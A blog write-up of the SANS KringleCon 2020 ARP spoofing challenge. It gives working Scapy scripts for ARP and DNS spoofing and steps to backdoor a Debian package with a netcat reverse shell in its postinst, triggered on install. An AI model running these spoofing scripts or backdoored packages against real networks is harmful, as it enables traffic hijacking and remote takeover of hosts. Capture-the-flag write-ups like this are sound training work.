---
layout: post
title:  "ARP Sheganigans - SANS 2020 writeup"
date:   2020-12-21 19:59:44 +0100
categories: redteam python scapy kringlecon sans2020
---
At Kringlecon 2020 was there a network redteam objective. 

We get the knowledge of the evil Jack Frost that have taken over a box. We need to get access to the box to get to know who recused from the voting.

We get access to a console with three terminals. I used for. Read HELP.md for tips and tricks to use tmux (I love tmux now btw)

We also get a hint of what we need to do from the motd and by talking to Alabaster Snowball. 

So we need to do a ARP spoofing attack and then work from there.

We are provided with the following directory structure:

{% highlight bash %}
$ ls -R
.:
HELP.md  debs  motd  pcaps  scripts

./debs:
gedit-common_3.36.1-1_all.deb                      netcat-traditional_1.10-41.1ubuntu1_amd64.deb  unzip_6.0-25ubuntu1_amd64.deb
golang-github-huandu-xstrings-dev_1.2.1-1_all.deb  nmap_7.80+dfsg1-2build1_amd64.deb
nano_4.8-1ubuntu1_amd64.deb                        socat_1.7.3.3-2_amd64.deb

./pcaps:
arp.pcap  dns.pcap

./scripts:
arp_resp.py  dns_resp.py
{% endhighlight %}

We will build on the scripts in scripts in the script folder, but first let us look at the pcaps.

Use the following script to read and dump the pcaps. Copy them out and study the structure of the packets:

{% highlight python %}
from scapy.all import *
import sys

packets = rdpcap(sys.argv[1])

for packet in packets:
	packet.show()
{% endhighlight %}

We will make packets that looks like them when we edit our scripts.

Another tip is to have tshark/tcpdump running when developing and executing the scripts.

{% highlight bash %}
tshark -i eth0
{% endhighlight %}

The first part is to mimic an arp response to trick the other computer into thinking we are the DNS server.

The following scripts does that:
{% highlight python %}
#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_arp_packets(packet):
    #packet.show()
    #print(len(packet))
    # if arp request, then we need to fill this out to send back our mac as the response
    if ARP in packet and packet[ARP].op == 1:
        ether_resp = Ether(dst=packet.getlayer(ARP).hwsrc, type=0x806, src=macaddr)

        arp_response = ARP(pdst=packet.getlayer(ARP).psrc)
        arp_response.op = "is-at"
        arp_response.plen = 4
        arp_response.hwlen = 6
        #arp_response.ptype = 'IPv4'
        #arp_response.hwtype = 0x1

        arp_response.hwsrc = macaddr
        arp_response.psrc = packet.getlayer(ARP).pdst
        arp_response.hwdst = packet.getlayer(ARP).hwsrc
        arp_response.pdst = packet.getlayer(ARP).psrc

        response = ether_resp/arp_response
        #print('SENDING',response)
        #response.show()
        sendp(response, iface="eth0")

def main():
    # We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
    #while True:
    main()
{% endhighlight %}

It is only needed to send one packet, but in the beginnig can it be nice to use the while True in the last part of the program

If you have tshark running at this point can you see that the other part now wants some DNS answers. Let us give the other part what he wishes:

{% highlight python %}
#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid
import sys

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
# destination ip we arp spoofed
ipaddr_we_arp_spoofed = sys.argv[1]

def handle_dns_request(packet):
    #packet.show()
    # Need to change mac addresses, Ip Addresses, and ports below.
    # We also need
    eth = Ether(src=macaddr, dst=packet.getlayer(Ether).src)   # need to replace mac addresses
    ip  = IP(dst=packet[IP].src, src=packet[IP].dst)                          # need to replace IP addresses
    udp = UDP(dport=packet[UDP].sport, sport=53)                             # need to replace ports
    dns = DNS(id=packet[DNS].id,qd=packet[DNS].qd,an=DNSRR(rrname=packet[DNS].qd.qname, type='A',ttl=82159,rdata=ipaddr),ra=1,qr=1)
    dns_response = eth / ip / udp / dns
    #eth.show()
    #ip.show()
    #dns_response.show()
    sendp(dns_response, iface="eth0")

def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ] )

    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)

if __name__ == "__main__":
    while True:
        main()
{% endhighlight %}

Again, just keep this running so we always will give a response back if anyone want some DNS from us

Now can we see in tshark that the other part wants some http communication. Use the following tshark to only show tcp traffic:

{% highlight bash %}
tshark -i eth0 -f "tcp"
{% endhighlight %}

Lets use python to see what the other part wants

{% highlight bash %}
python3 -m http.server 80
{% endhighlight %}

Now can we see that the other part wants a deb file.

Luckily for us is there some deb files that can be modified and served.

I used the netcat one to create a reverse shell back to us. But first lets backdoor the debian package.

Do the following to unpack the package
{% highlight bash %}
cd ~/debs
mkdir tmp
dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
{% endhighlight %}

Now edit the DEBIAN/control to match the package name with the one that the other part requests. In my case suriv.

Now edit the DEBIAN/postinst and append the following:
{% highlight bash %}
/bin/nc <your ip here> 4444 –e /usr/bin/bash
{% endhighlight %}

Pack the package up again:
{% highlight bash %}
cd ~/debs
dpkg-deb -b tmp suriv_amd64.deb
{% endhighlight %}

Create the correct directory structure to serve the file from (See the output of the previous python3 -m http.server command)

Start the reverse shell

{% highlight bash %}
nc -lvp 4444
{% endhighlight %}

NOTE: If you not have done it already, remember to remove the while True part from the arp spoof. Else will it mess with your reverse shell.

Start serving the file and wait for the other part to fetch the file. You might need to run the arp spoof script more than once.

When you have shell access do a ls and notice the file. Dump the file to your computer, read it and win!
